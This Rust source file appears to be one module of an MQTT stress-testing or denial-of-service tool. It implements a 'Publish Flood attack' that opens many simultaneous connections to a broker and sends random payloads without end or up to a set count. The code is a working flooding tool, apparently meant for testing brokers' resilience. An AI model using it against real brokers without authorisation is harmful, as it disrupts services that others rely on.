use std::sync::{
    Arc,
    atomic::{AtomicBool, Ordering},
};

use anyhow::{Context, Result};
use rand::{RngExt, rngs::SmallRng};
use rumqttc::{AsyncClient, MqttOptions, QoS};
use tokio::{
    task::JoinSet,
    time::{self, Duration, sleep},
};

use crate::{
    cli::Args,
    helper::{
        CLEAN_SESSION, CLIENT_ID_LENGTH, EVENTLOOP_DRAIN_TIMEOUT, KEEP_ALIVE_SECS,
        packet_count_desc, random_string, random_topic,
    },
    stats::Stats,
};

const RETAIN: bool = false;
const DEFAULT_CHANNEL_CAPACITY: usize = 1024;

pub async fn run_publish_flood(args: &Args, stats: Arc<Stats>) -> Result<()> {
    println!(
        "Starting Publish Flood attack against {}:{} using MQTT v{} with {} simultaneous connections, sending {} PUBLISH packets",
        args.broker_hostname,
        args.port,
        args.protocol_version,
        args.simultaneous_connections,
        packet_count_desc(args.total_packets)
    );

    let packets_per_client: Vec<Option<usize>> = if args.total_packets == 0 {
        vec![None; args.simultaneous_connections]
    } else {
        let base = args.total_packets / args.simultaneous_connections;
        let remainder = args.total_packets % args.simultaneous_connections;
        (0..args.simultaneous_connections)
            .map(|i| Some(base + usize::from(i < remainder)))
            .collect()
    };
    let qos = QoS::from(args.qos_level);

    let mut tasks = JoinSet::new();
    for packets in packets_per_client {
        tasks.spawn(publish_client(
            args.username.clone(),
            args.password.clone(),
            args.broker_hostname.clone(),
            args.port,
            qos,
            packets,
            args.payload_size,
            args.send_delay,
            stats.clone(),
        ));
        if args.spawn_delay > 0 {
            sleep(Duration::from_millis(args.spawn_delay)).await;
        }
    }

    while let Some(result) = tasks.join_next().await {
        result.context("worker task panicked")?;
    }

    Ok(())
}

// This was changed post testing. No separate connection/disconnection per publish.
async fn do_publish(
    client: &AsyncClient,
    topic: &str,
    qos: QoS,
    payload: &[u8],
    stats: &Stats,
    running: &AtomicBool,
) -> bool {
    if !running.load(Ordering::Relaxed) {
        return false;
    }
    if client.publish(topic, qos, RETAIN, payload).await.is_ok() {
        stats.publishes_queued.fetch_add(1, Ordering::Relaxed);
    } else {
        eprintln!("Failed to publish message");
        stats.publishes_queue_failed.fetch_add(1, Ordering::Relaxed);
    }
    true
}

#[allow(clippy::too_many_arguments)]
async fn publish_client(
    username: Option<String>,
    password: Option<String>,
    hostname: String,
    port: u16,
    qos: QoS,
    packets_per_client: Option<usize>,
    payload_size: usize,
    send_delay: u64,
    stats: Arc<Stats>,
) {
    let mut rng: SmallRng = rand::make_rng();
    let client_id = random_string(&mut rng, CLIENT_ID_LENGTH);
    let topic = random_topic(&mut rng);
    let channel_capacity = packets_per_client
        .unwrap_or(DEFAULT_CHANNEL_CAPACITY)
        .max(1);
    let running = Arc::new(AtomicBool::new(true));
    let eventloop_running = running.clone();

    let mut options = MqttOptions::new(client_id.clone(), hostname, port);
    options.set_keep_alive(Duration::from_secs(u64::from(KEEP_ALIVE_SECS)));
    options.set_clean_session(CLEAN_SESSION);
    if let (Some(username), Some(password)) = (&username, &password) {
        options.set_credentials(username, password);
    }
    options.set_request_channel_capacity(channel_capacity);
    options.set_inflight(u16::try_from(channel_capacity).unwrap_or(u16::MAX));
    let (client, mut eventloop) = AsyncClient::new(options, channel_capacity);

    let mut eventloop_handle = tokio::spawn(async move {
        loop {
            match eventloop.poll().await {
                Ok(_) => {}
                Err(error) => {
                    eprintln!("Client {client_id}: event loop error: {error}");
                    eventloop_running.store(false, Ordering::Relaxed);
                    break;
                }
            }
        }
    });

    let mut payload = vec![0u8; payload_size];
    let send_delay = (send_delay > 0).then(|| Duration::from_millis(send_delay));

    match packets_per_client {
        None => loop {
            rng.fill(&mut payload[..]);
            if !do_publish(&client, &topic, qos, &payload, &stats, &running).await {
                break;
            }
            if let Some(delay) = send_delay {
                sleep(delay).await;
            }
        },
        Some(count) => {
            for _ in 0..count {
                rng.fill(&mut payload[..]);
                if !do_publish(&client, &topic, qos, &payload, &stats, &running).await {
                    break;
                }
                if let Some(delay) = send_delay {
                    sleep(delay).await;
                }
            }
            if let Err(error) = client.disconnect().await {
                eprintln!("Failed to send disconnect: {error}");
            }
            match time::timeout(EVENTLOOP_DRAIN_TIMEOUT, &mut eventloop_handle).await {
                Ok(_) => {}
                Err(_) => eventloop_handle.abort(),
            }
        }
    }
}
